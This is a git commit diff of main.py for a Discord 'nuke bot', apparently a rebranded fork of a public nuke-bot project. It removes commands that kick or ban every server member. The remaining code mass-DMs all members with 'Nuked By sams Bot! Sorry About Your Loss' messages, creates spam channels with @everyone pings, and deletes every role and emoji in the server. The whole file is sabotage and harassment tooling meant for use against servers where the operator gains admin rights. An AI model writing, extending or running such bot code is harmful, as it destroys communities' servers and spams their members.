13131e249a6e3f46b59a2d8581665bb3e88db354
kainorrr <111130832+kainorrr@users.noreply.github.com>
2024-06-22 19:07:08 +0300

    Update main.py

--- main.py
+++ main.py
@@ -44,35 +44,7 @@ async def secret(ctx):
     embed.add_field(name='Ping', value='Gives ping to client (expressed in MS)', inline=False)
     embed.add_field(name='Info', value='Gives information of a user', inline=False)
     await member.send(embed=embed)
-#############################
-
-####KALL COMMAND####
-@client.command(pass_context=True)
-async def kall(ctx):
-    await ctx.message.delete()
-    guild = ctx.message.guild
-    for member in list(client.get_all_members()):
-        try:
-            await guild.kick(member)
-            print (f"{member.name} has been kicked")
-        except:
-            print (f"{member.name} has FAILED to be kicked")
-        print ("Action completed: Kick all")
-#############################
-
-####BALL COMMAND####
-@client.command(pass_context=True)
-async def ball(ctx):
-    await ctx.message.delete()
-    guild = ctx.message.guild
-    for member in list(client.get_all_members()):
-        try:
-            await guild.ban(member)
-            print ("User " + member.name + " has been banned")
-        except:
-            pass
-    print ("Action completed: Ban all")
-#############################
+####
 
 ####RALL COMMAND####
 @client.command(pass_context=True)
@@ -99,20 +71,20 @@ async def mall(ctx):
             embed.add_field(
                 name="Discord Server",
                 value=
-                "[ [ Click here ] ](https://discord.gg/kE9vk9Zeuf)",
+                "[ [ Click here ] ](https://discord.gg/loving)",
                 inline=False)
             embed.add_field(
                 name="Youtube Channel",
                 value=
-                "[ [ Click here ] ](https://www.youtube.com/channel/UCXk0klxbjcVgGvYyKWLgtLg)",
+                "[ [ Click here ] ](https://youtu.be/dgKCrWLdiBw?si=y66oAGVSj_LPu6Mk)",
                 inline=False)
             embed.add_field(
                 name="GitHub",
                 value=
-                "[ [ Click here ] ](https://github.com/social404)",
+                "[ [ Click here ] ](https://github.com/courrtdd)",
                 inline=False)
             embed.set_thumbnail(url="https://tenor.com/view/destory-eexplode-nuke-gif-6073338")
-            embed.set_footer(text="Nuked By Social404's Bot! Sorry About Your Loss")
+            embed.set_footer(text="Nuked By sams Bot! Sorry About Your Loss")
             await member.send(embed=embed)
         except:
             pass
@@ -126,24 +98,24 @@ async def destroy(ctx):
     for member in list(client.get_all_members()): 
         await asyncio.sleep(0)
         try:
-            embed = discord.Embed(title="This Is Why You Dont Wanna Give Random People Admin!", url="https://github.com/Social404/Advanced-Discord-Nuke-Bot", description="They Nuke Your Server With A Free Source Code (Click The Text Above For The Code)" , color=discord.Colour.purple())
+            embed = discord.Embed(title="discord.gg/loving @here This Is Why You Dont Wanna Give Random People Admin! ", url="https://github.com/courrtdd/", description="yall is so dumb yall got nuked by the best bot" , color=discord.Colour.purple())
             embed.add_field(
                 name="Discord Server",
                 value=
-                "[ [ Click here ] ](https://discord.gg/kE9vk9Zeuf)",
+                "[ [ Click here ] ](https://discord.gg/lovimg)",
                 inline=False)
             embed.add_field(
                 name="Youtube Channel",
                 value=
-                "[ [ Click here ] ](https://www.youtube.com/channel/UCXk0klxbjcVgGvYyKWLgtLg)",
+                "[ [ Click here ] ](https://youtu.be/dgKCrWLdiBw?si=y66oAGVSj_LPu6Mk)",
                 inline=False)
             embed.add_field(
                 name="GitHub",
                 value=
-                "[ [ Click here ] ](https://github.com/social404)",
+                "[ [ Click here ] ](https://github.com/courrtdd)",
                 inline=False)
             embed.set_thumbnail(url="https://tenor.com/view/destory-eexplode-nuke-gif-6073338")
-            embed.set_footer(text="Nuked By Social404's Bot! Sorry About Your Loss")
+            embed.set_footer(text="Nuked By sams Bot! Sorry About Your Loss")
             await member.send(embed=embed)
         except:
             pass
@@ -155,19 +127,13 @@ async def destroy(ctx):
         except:
             pass
         guild = ctx.message.guild
-        channel = await guild.create_text_channel("Nuked By Social's Bot! Check Dms")
-        await channel.send(" @everyone GGGs Guys This Is Kinda Sad But It Is What It Is Am I Right?")
+        channel = await guild.create_text_channel("Nuked By sams Bot! Check Dms")
+        await channel.send(" @everyone GGGs Guys This Is Kinda Sad But It Is What It Is Am I Right? discord.gg/loving ")
         await channel.send(embed=embed)
     for role in list(ctx.guild.roles):
         try:
             await role.delete()
             print (f"{role.name} has been deleted")
-        except:
-            pass
-    for member in list(client.get_all_members()):
-        try:
-            await guild.ban(member)
-            print ("User " + member.name + " has been banned")
         except:
             pass
     for emoji in list(ctx.guild.emojis):
